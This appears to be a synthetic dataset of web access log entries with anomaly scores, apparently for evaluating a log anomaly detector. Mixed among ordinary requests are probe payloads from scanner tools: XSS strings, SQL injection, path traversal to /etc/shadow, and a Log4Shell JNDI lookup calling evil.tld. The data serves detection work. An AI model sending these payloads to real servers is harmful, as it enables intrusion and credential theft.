score_content,score_session,score_fused,score_fused_norm,line
52.99639892578125,,52.99639892578125,52.99639892578125,{"remote_addr": "34.51.229.20", "time_local": "11/Jan/2025:09:06:54 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 302, "body_bytes_sent": 9655, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
70.21247100830078,,70.21247100830078,70.21247100830078,{"remote_addr": "105.180.111.167", "time_local": "11/Jan/2025:09:06:55 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 2089, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
1.9238643646240234,,1.9238643646240234,1.9238643646240234,{"remote_addr": "253.51.54.70", "time_local": "11/Jan/2025:09:06:55 -0700", "request": "GET /api/products HTTP/2", "status": 200, "body_bytes_sent": 8652, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
11139.9482421875,,11139.9482421875,11139.9482421875,{"remote_addr": "236.239.43.67", "time_local": "11/Jan/2025:09:06:56 -0700", "request": "TRACE /cgi-bin/test.cgi HTTP/2", "status": 500, "body_bytes_sent": 571, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
50.1124153137207,,50.1124153137207,50.1124153137207,{"remote_addr": "224.78.62.83", "time_local": "11/Jan/2025:09:06:57 -0700", "request": "DELETE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 9610, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
49.92236328125,,49.92236328125,49.92236328125,{"remote_addr": "17.54.236.6", "time_local": "11/Jan/2025:09:06:57 -0700", "request": "DELETE /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 2744, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
25.947406768798828,,25.947406768798828,25.947406768798828,{"remote_addr": "67.192.177.22", "time_local": "11/Jan/2025:09:06:58 -0700", "request": "DELETE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 4742, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
24.330913543701172,,24.330913543701172,24.330913543701172,{"remote_addr": "147.72.40.190", "time_local": "11/Jan/2025:09:06:59 -0700", "request": "GET /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 10617, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
127.35920715332031,,127.35920715332031,127.35920715332031,{"remote_addr": "136.122.147.48", "time_local": "11/Jan/2025:09:06:59 -0700", "request": "TRACE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 14666, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
3.1350417137145996,,3.1350417137145996,3.1350417137145996,{"remote_addr": "27.209.88.53", "time_local": "11/Jan/2025:09:07:00 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 8305, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
104.73706817626953,,104.73706817626953,104.73706817626953,{"remote_addr": "197.33.165.200", "time_local": "11/Jan/2025:09:07:01 -0700", "request": "TRACE /profile HTTP/2", "status": 200, "body_bytes_sent": 6958, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
7.71684455871582,,7.71684455871582,7.71684455871582,{"remote_addr": "5.203.68.100", "time_local": "11/Jan/2025:09:07:01 -0700", "request": "POST /contact HTTP/2", "status": 301, "body_bytes_sent": 12585, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
103.11483764648438,,103.11483764648438,103.11483764648438,{"remote_addr": "49.76.122.146", "time_local": "11/Jan/2025:09:07:01 -0700", "request": "TRACE /index.html HTTP/2", "status": 201, "body_bytes_sent": 15389, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
70.05026245117188,,70.05026245117188,70.05026245117188,{"remote_addr": "125.193.145.173", "time_local": "11/Jan/2025:09:07:02 -0700", "request": "HEAD /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 5250, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
13.305008888244629,,13.305008888244629,13.305008888244629,{"remote_addr": "57.138.30.150", "time_local": "11/Jan/2025:09:07:02 -0700", "request": "PUT /api/products HTTP/2", "status": 200, "body_bytes_sent": 2520, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
13.50405502319336,,13.50405502319336,13.50405502319336,{"remote_addr": "22.181.186.144", "time_local": "11/Jan/2025:09:07:03 -0700", "request": "PUT /login HTTP/2", "status": 200, "body_bytes_sent": 15322, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
50.550437927246094,,50.550437927246094,50.550437927246094,{"remote_addr": "118.200.122.209", "time_local": "11/Jan/2025:09:07:04 -0700", "request": "HEAD /logout HTTP/2", "status": 302, "body_bytes_sent": 5514, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
104.77135467529297,,104.77135467529297,104.77135467529297,{"remote_addr": "202.77.75.158", "time_local": "11/Jan/2025:09:07:05 -0700", "request": "TRACE /contact HTTP/2", "status": 204, "body_bytes_sent": 17348, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
1.8893252611160278,,1.8893252611160278,1.8893252611160278,{"remote_addr": "163.171.51.86", "time_local": "11/Jan/2025:09:07:06 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 1620, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
70.25294494628906,,70.25294494628906,70.25294494628906,{"remote_addr": "45.7.159.138", "time_local": "11/Jan/2025:09:07:07 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 10296, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
0.3131950795650482,,0.3131950795650482,0.3131950795650482,{"remote_addr": "27.213.122.227", "time_local": "11/Jan/2025:09:07:07 -0700", "request": "GET /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 15981, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
3.1487557888031006,,3.1487557888031006,3.1487557888031006,{"remote_addr": "134.47.124.233", "time_local": "11/Jan/2025:09:07:08 -0700", "request": "POST /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 11875, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
30.162492752075195,,30.162492752075195,30.162492752075195,{"remote_addr": "119.224.160.164", "time_local": "11/Jan/2025:09:07:08 -0700", "request": "POST /search?q=camera HTTP/2", "status": 304, "body_bytes_sent": 8012, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
70.12226104736328,,70.12226104736328,70.12226104736328,{"remote_addr": "93.216.118.94", "time_local": "11/Jan/2025:09:07:09 -0700", "request": "HEAD /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 16857, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
3.1336121559143066,,3.1336121559143066,3.1336121559143066,{"remote_addr": "2.227.203.5", "time_local": "11/Jan/2025:09:07:10 -0700", "request": "POST /.git/config HTTP/2", "status": 200, "body_bytes_sent": 958, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
2.917050838470459,,2.917050838470459,2.917050838470459,{"remote_addr": "41.163.254.33", "time_local": "11/Jan/2025:09:07:11 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 3025, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
4.886087894439697,,4.886087894439697,4.886087894439697,{"remote_addr": "166.141.36.224", "time_local": "11/Jan/2025:09:07:12 -0700", "request": "POST /about HTTP/2", "status": 200, "body_bytes_sent": 2586, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.268857717514038,,2.268857717514038,2.268857717514038,{"remote_addr": "31.74.141.175", "time_local": "11/Jan/2025:09:07:13 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 5836, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
104.79690551757812,,104.79690551757812,104.79690551757812,{"remote_addr": "65.68.97.29", "time_local": "11/Jan/2025:09:07:13 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 4048, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
70.08158874511719,,70.08158874511719,70.08158874511719,{"remote_addr": "89.223.55.53", "time_local": "11/Jan/2025:09:07:14 -0700", "request": "HEAD /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 12002, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
74.76154327392578,,74.76154327392578,74.76154327392578,{"remote_addr": "12.34.247.91", "time_local": "11/Jan/2025:09:07:15 -0700", "request": "OPTIONS /.env HTTP/2", "status": 302, "body_bytes_sent": 4347, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
107.74113464355469,,107.74113464355469,107.74113464355469,{"remote_addr": "145.156.190.86", "time_local": "11/Jan/2025:09:07:16 -0700", "request": "TRACE /about HTTP/2", "status": 304, "body_bytes_sent": 11238, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
0.24438582360744476,,0.24438582360744476,0.24438582360744476,{"remote_addr": "176.241.101.138", "time_local": "11/Jan/2025:09:07:17 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 11228, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
27.360271453857422,,27.360271453857422,27.360271453857422,{"remote_addr": "200.212.54.219", "time_local": "11/Jan/2025:09:07:17 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 17671, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
4.691217422485352,,4.691217422485352,4.691217422485352,{"remote_addr": "108.209.111.234", "time_local": "11/Jan/2025:09:07:18 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 17779, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30220.107421875,,30220.107421875,30220.107421875,{"remote_addr": "166.142.39.45", "time_local": "11/Jan/2025:09:07:18 -0700", "request": "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/2", "status": 403, "body_bytes_sent": 726, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
30124.75,,30124.75,30124.75,{"remote_addr": "65.80.143.99", "time_local": "11/Jan/2025:09:07:19 -0700", "request": "GET /assets/app.js HTTP/2", "status": 401, "body_bytes_sent": 1289, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
70.04291534423828,,70.04291534423828,70.04291534423828,{"remote_addr": "180.138.185.177", "time_local": "11/Jan/2025:09:07:20 -0700", "request": "HEAD /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8041, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
14.590365409851074,,14.590365409851074,14.590365409851074,{"remote_addr": "7.133.158.230", "time_local": "11/Jan/2025:09:07:20 -0700", "request": "PUT /wp-login.php HTTP/2", "status": 304, "body_bytes_sent": 3998, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
0.20721721649169922,,0.20721721649169922,0.20721721649169922,{"remote_addr": "102.46.117.16", "time_local": "11/Jan/2025:09:07:21 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 3460, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
35.817989349365234,,35.817989349365234,35.817989349365234,{"remote_addr": "70.175.156.250", "time_local": "11/Jan/2025:09:07:21 -0700", "request": "PUT /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 9600, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
35.80176544189453,,35.80176544189453,35.80176544189453,{"remote_addr": "71.1.144.105", "time_local": "11/Jan/2025:09:07:22 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 6179, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
24.440767288208008,,24.440767288208008,24.440767288208008,{"remote_addr": "99.114.218.4", "time_local": "11/Jan/2025:09:07:22 -0700", "request": "GET /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 10931, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
13.661574363708496,,13.661574363708496,13.661574363708496,{"remote_addr": "80.83.146.220", "time_local": "11/Jan/2025:09:07:24 -0700", "request": "PUT / HTTP/2", "status": 200, "body_bytes_sent": 1727, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.9426871538162231,,1.9426871538162231,1.9426871538162231,{"remote_addr": "51.132.99.136", "time_local": "11/Jan/2025:09:07:24 -0700", "request": "GET /api/products HTTP/2", "status": 200, "body_bytes_sent": 13252, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
24.366350173950195,,24.366350173950195,24.366350173950195,{"remote_addr": "17.189.64.84", "time_local": "11/Jan/2025:09:07:25 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 1201, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
127.2769546508789,,127.2769546508789,127.2769546508789,{"remote_addr": "75.111.165.188", "time_local": "11/Jan/2025:09:07:25 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 17537, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
70.12084197998047,,70.12084197998047,70.12084197998047,{"remote_addr": "34.179.40.85", "time_local": "11/Jan/2025:09:07:27 -0700", "request": "HEAD /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 4504, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
45.876155853271484,,45.876155853271484,45.876155853271484,{"remote_addr": "128.217.88.158", "time_local": "11/Jan/2025:09:07:28 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 15399, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
71.51396179199219,,71.51396179199219,71.51396179199219,{"remote_addr": "120.31.17.46", "time_local": "11/Jan/2025:09:07:28 -0700", "request": "OPTIONS /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 3918, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
13.189594268798828,,13.189594268798828,13.189594268798828,{"remote_addr": "248.235.252.73", "time_local": "11/Jan/2025:09:07:29 -0700", "request": "PUT /server-status HTTP/2", "status": 204, "body_bytes_sent": 4289, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
38.74779510498047,,38.74779510498047,38.74779510498047,{"remote_addr": "184.126.242.141", "time_local": "11/Jan/2025:09:07:30 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 13380, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
46.18630599975586,,46.18630599975586,46.18630599975586,{"remote_addr": "252.83.81.212", "time_local": "11/Jan/2025:09:07:31 -0700", "request": "HEAD /.env HTTP/2", "status": 200, "body_bytes_sent": 1407, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
30148.560546875,,30148.560546875,30148.560546875,{"remote_addr": "137.91.70.243", "time_local": "11/Jan/2025:09:07:32 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 400, "body_bytes_sent": 875, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
1.9241046905517578,,1.9241046905517578,1.9241046905517578,{"remote_addr": "177.196.146.226", "time_local": "11/Jan/2025:09:07:33 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 9021, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
35.767826080322266,,35.767826080322266,35.767826080322266,{"remote_addr": "248.122.141.100", "time_local": "11/Jan/2025:09:07:33 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 16405, "http_referer": "-", "http_user_agent": "dirb/2.22"}
30173.375,,30173.375,30173.375,{"remote_addr": "245.87.15.10", "time_local": "11/Jan/2025:09:07:34 -0700", "request": "HEAD /contact HTTP/2", "status": 429, "body_bytes_sent": 1084, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
27.67498207092285,,27.67498207092285,27.67498207092285,{"remote_addr": "167.151.77.151", "time_local": "11/Jan/2025:09:07:34 -0700", "request": "DELETE /contact HTTP/2", "status": 200, "body_bytes_sent": 8737, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
35.796836853027344,,35.796836853027344,35.796836853027344,{"remote_addr": "178.176.94.241", "time_local": "11/Jan/2025:09:07:34 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5236, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.784968376159668,,4.784968376159668,4.784968376159668,{"remote_addr": "45.31.230.102", "time_local": "11/Jan/2025:09:07:35 -0700", "request": "POST /api/products HTTP/2", "status": 200, "body_bytes_sent": 11041, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
95.7994384765625,,95.7994384765625,95.7994384765625,{"remote_addr": "74.180.3.226", "time_local": "11/Jan/2025:09:07:36 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 2069, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
70.09517669677734,,70.09517669677734,70.09517669677734,{"remote_addr": "74.185.69.149", "time_local": "11/Jan/2025:09:07:37 -0700", "request": "HEAD /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 9695, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
24.394182205200195,,24.394182205200195,24.394182205200195,{"remote_addr": "146.83.205.163", "time_local": "11/Jan/2025:09:07:38 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 7741, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
24.383359909057617,,24.383359909057617,24.383359909057617,{"remote_addr": "36.184.230.94", "time_local": "11/Jan/2025:09:07:38 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 10134, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
4.854707717895508,,4.854707717895508,4.854707717895508,{"remote_addr": "171.111.118.8", "time_local": "11/Jan/2025:09:07:39 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 3976, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
2.3085246086120605,,2.3085246086120605,2.3085246086120605,{"remote_addr": "245.216.25.69", "time_local": "11/Jan/2025:09:07:40 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 15266, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
130.02569580078125,,130.02569580078125,130.02569580078125,{"remote_addr": "27.25.73.143", "time_local": "11/Jan/2025:09:07:41 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 302, "body_bytes_sent": 7688, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.939877510070801,,2.939877510070801,2.939877510070801,{"remote_addr": "78.168.142.57", "time_local": "11/Jan/2025:09:07:42 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 7486, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.011397361755371,,2.011397361755371,2.011397361755371,{"remote_addr": "181.100.2.42", "time_local": "11/Jan/2025:09:07:43 -0700", "request": "GET /logout HTTP/2", "status": 200, "body_bytes_sent": 5397, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
50.087459564208984,,50.087459564208984,50.087459564208984,{"remote_addr": "87.54.37.6", "time_local": "11/Jan/2025:09:07:43 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 14403, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
127.1904296875,,127.1904296875,127.1904296875,{"remote_addr": "145.208.138.159", "time_local": "11/Jan/2025:09:07:44 -0700", "request": "TRACE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 11272, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
45.953731536865234,,45.953731536865234,45.953731536865234,{"remote_addr": "69.216.125.37", "time_local": "11/Jan/2025:09:07:44 -0700", "request": "HEAD /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 10423, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
11.695080757141113,,11.695080757141113,11.695080757141113,{"remote_addr": "100.47.244.18", "time_local": "11/Jan/2025:09:07:44 -0700", "request": "PUT /.git/config HTTP/2", "status": 200, "body_bytes_sent": 909, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
46.026615142822266,,46.026615142822266,46.026615142822266,{"remote_addr": "66.15.96.130", "time_local": "11/Jan/2025:09:07:45 -0700", "request": "HEAD /index.html HTTP/2", "status": 200, "body_bytes_sent": 14192, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
27.689661026000977,,27.689661026000977,27.689661026000977,{"remote_addr": "106.192.108.53", "time_local": "11/Jan/2025:09:07:46 -0700", "request": "DELETE /logout HTTP/2", "status": 200, "body_bytes_sent": 4349, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
3.057086706161499,,3.057086706161499,3.057086706161499,{"remote_addr": "235.218.74.32", "time_local": "11/Jan/2025:09:07:47 -0700", "request": "POST /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 13053, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
71.47320556640625,,71.47320556640625,71.47320556640625,{"remote_addr": "50.231.139.22", "time_local": "11/Jan/2025:09:07:47 -0700", "request": "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 16279, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
0.28184354305267334,,0.28184354305267334,0.28184354305267334,{"remote_addr": "185.98.204.252", "time_local": "11/Jan/2025:09:07:48 -0700", "request": "GET /.git/config HTTP/2", "status": 200, "body_bytes_sent": 2398, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
30.543867111206055,,30.543867111206055,30.543867111206055,{"remote_addr": "59.136.204.201", "time_local": "11/Jan/2025:09:07:48 -0700", "request": "DELETE /profile HTTP/2", "status": 301, "body_bytes_sent": 11929, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
3.3847200870513916,,3.3847200870513916,3.3847200870513916,{"remote_addr": "53.243.193.203", "time_local": "11/Jan/2025:09:07:48 -0700", "request": "POST /.env HTTP/2", "status": 204, "body_bytes_sent": 5199, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
27.654388427734375,,27.654388427734375,27.654388427734375,{"remote_addr": "149.84.94.161", "time_local": "11/Jan/2025:09:07:50 -0700", "request": "DELETE /profile HTTP/2", "status": 200, "body_bytes_sent": 4610, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
47.45328140258789,,47.45328140258789,47.45328140258789,{"remote_addr": "222.25.126.97", "time_local": "11/Jan/2025:09:07:51 -0700", "request": "HEAD /server-status HTTP/2", "status": 200, "body_bytes_sent": 5020, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
127.22895812988281,,127.22895812988281,127.22895812988281,{"remote_addr": "152.34.3.34", "time_local": "11/Jan/2025:09:07:52 -0700", "request": "TRACE /search?q=ssd HTTP/2", "status": 201, "body_bytes_sent": 8553, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
13.369948387145996,,13.369948387145996,13.369948387145996,{"remote_addr": "89.132.164.150", "time_local": "11/Jan/2025:09:07:52 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 1316, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
24.3946590423584,,24.3946590423584,24.3946590423584,{"remote_addr": "15.11.88.209", "time_local": "11/Jan/2025:09:07:53 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 12975, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
104.52726745605469,,104.52726745605469,104.52726745605469,{"remote_addr": "46.252.94.36", "time_local": "11/Jan/2025:09:07:53 -0700", "request": "TRACE /server-status HTTP/2", "status": 200, "body_bytes_sent": 1968, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
30198.283203125,,30198.283203125,30198.283203125,{"remote_addr": "178.89.127.126", "time_local": "11/Jan/2025:09:07:54 -0700", "request": "OPTIONS / HTTP/2", "status": 404, "body_bytes_sent": 447, "http_referer": "-", "http_user_agent": "dirb/2.22"}
2.021468162536621,,2.021468162536621,2.021468162536621,{"remote_addr": "141.32.128.93", "time_local": "11/Jan/2025:09:07:55 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 16692, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
24.38255500793457,,24.38255500793457,24.38255500793457,{"remote_addr": "40.212.122.64", "time_local": "11/Jan/2025:09:07:55 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 9944, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
127.17642211914062,,127.17642211914062,127.17642211914062,{"remote_addr": "50.77.37.99", "time_local": "11/Jan/2025:09:07:56 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 6106, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
